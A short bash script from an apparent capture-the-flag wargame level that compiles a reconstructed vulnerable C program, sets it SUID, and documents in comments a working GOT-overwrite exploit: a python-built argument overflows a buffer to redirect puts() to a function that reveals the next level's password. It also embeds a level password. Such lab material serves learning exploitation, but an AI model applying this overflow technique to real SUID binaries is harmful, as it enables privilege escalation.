#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level8@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level8@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc source.c -o ft_level7

# Set SUID to give root user permissions
chmod u+s ft_level7

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level7 ~


# Then you have to run the program and cat .pass as level7 by taping manually these commands

#	su level7
#	// check the new address of m() function, in this exemple it is 0x08048514.
#	// check the new puts() GOT entry, in this exemple it is 0x804a014.
#	/home/user/level8/ft_level7 $(python -c 'print "A" * 20 + "\x14\xa0\x04\x08"') $(python -c 'print "\x14\x85\x04\x08"')
